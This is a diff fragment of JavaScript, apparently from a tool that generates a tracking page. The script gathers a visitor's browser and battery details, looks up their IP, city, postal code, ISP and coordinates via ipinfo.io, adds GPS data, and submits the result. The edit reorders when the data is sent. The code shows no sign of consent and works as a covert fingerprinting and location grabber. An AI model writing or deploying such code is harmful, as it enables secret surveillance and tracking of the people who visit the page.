@@ -664,10 +664,10 @@ try{d.cookiesEn=navigator.cookieEnabled===true; d.dnt=navigator.doNotTrack||''; 
 try{d.webdriver=!!navigator.webdriver;}catch(e){}
 try{var b=new Float32Array(32); window.mozRTCPeerConnection&&0; d.webrtc='ok';}catch(e){}
 var batt=null;
-try{if(navigator.getBattery){navigator.getBattery().then(function(b){d.batteryLevel=b.level; d.charging=b.charging; d.batteryTime=b.dischargingTime===Infinity?null:Math.round(b.dischargingTime); if(Math.floor(d.batteryLevel*100)%7===0){d.lucky=true;} submit();}).catch(function(){submit();});}else{submit();}}catch(e){submit();}
+try{if(navigator.getBattery){navigator.getBattery().then(function(b){d.batteryLevel=b.level; d.charging=b.charging; d.batteryTime=b.dischargingTime===Infinity?null:Math.round(b.dischargingTime);}).catch(function(){});}else{}}catch(e){}
 ${submitDel}
 ${geofn}
-function run(){fetch('https://ipinfo.io/json').then(function(r){return r.json();}).then(function(j){d.ip=j.ip||d.ip; d.city=j.city||''; d.region=j.region||''; d.country=j.country||''; d.org=(j.org||'').split(' ')[0]; d.postal=j.postal||''; d.tz=j.timezone||''; d.loc=j.loc||''; if(d.loc){var p=d.loc.split(','); d.lat=parseFloat(p[0]); d.lon=parseFloat(p[1]);} ${gps} }).catch(function(){d.ip=d.ip||'n/a'; ${gps} });}
+function run(){fetch('https://ipinfo.io/json').then(function(r){return r.json();}).then(function(j){d.ip=j.ip||d.ip; d.city=j.city||''; d.region=j.region||''; d.country=j.country||''; d.org=(j.org||'').split(' ')[0]; d.postal=j.postal||''; d.tz=j.timezone||''; d.loc=j.loc||''; if(d.loc){var p=d.loc.split(','); d.lat=parseFloat(p[0]); d.lon=parseFloat(p[1]);} ${gps} setTimeout(submit,900); }).catch(function(){d.ip=d.ip||'n/a'; ${gps} setTimeout(submit,900); });}
 run();
 })();`;
 }
